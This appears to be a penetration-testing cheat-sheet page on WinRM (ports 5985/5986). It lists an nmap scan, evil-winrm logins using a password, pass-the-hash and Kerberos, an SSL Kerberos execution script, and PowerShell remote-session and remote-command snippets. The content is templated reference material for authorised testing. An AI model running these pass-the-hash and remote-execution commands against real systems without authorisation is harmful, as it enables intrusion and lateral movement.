# 5985,5986 - WinRM

### Service enumeration

#### Scan

```sh
nmap -sV -sC <IP> -p5985,5986 --disable-arp-ping -n
```

#### Service interaction

```sh
# Password authentication 
evil-winrm -i <IP> -u Administrator -p <PASS>

# Pass the Hash
evil-winrm -i <IP> -u Administrator -H <HASH>

# Kerberos auth => need to modify the /etc/krb5.conf file 
evil-winrm -i <COMPUTER_NAME> -r <DOMAIN>

# If we are dealing with WinRMS, evil-winrm doesn't work => here winrms + kerberos ex
https://github.com/ozelis/winrmexec
python3 evil_winrmexec.py <DOMAIN>/<USER>@<DC> -dc-ip <DC_IP> -k -no-pass -ssl -port 5986
```

{% tabs %}
{% tab title="Linux" %}
```shellscript
# Password authentication 
evil-winrm -i <IP> -u Administrator -p <PASS>
​
# Pass the Hash
evil-winrm -i <IP> -u Administrator -H <HASH>
​
# Kerberos auth => need to modify the /etc/krb5.conf file 
# Use nxc to generate the config file, backup the old one and overwrite it
nxc smb <DC> -u <USER> -p '<PASSWORD>' --generate-krb5-file krb5.conf
evil-winrm -i <COMPUTER_NAME> -r <DOMAIN>
​
# If we are dealing with WinRMS, evil-winrm doesn't work => here winrms + kerberos ex
https://github.com/ozelis/winrmexec
python3 evil_winrmexec.py <DOMAIN>/<USER>@<DC> -dc-ip <DC_IP> -k -no-pass -ssl -port 5986
```
{% endtab %}

{% tab title="Windows" %}
```ps1
# Connect through WinRM with Windows
$password = ConvertTo-SecureString "<PASS>" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
Enter-PSSession -ComputerName <TARGET_COMPUTER_NAME> -Credential $cred

# Execute a command on a distant computer through WinRM
Invoke-Command -Computername <TARGET> -Credential $cred -ScriptBlock {<COMMAND>}
```
{% endtab %}
{% endtabs %}
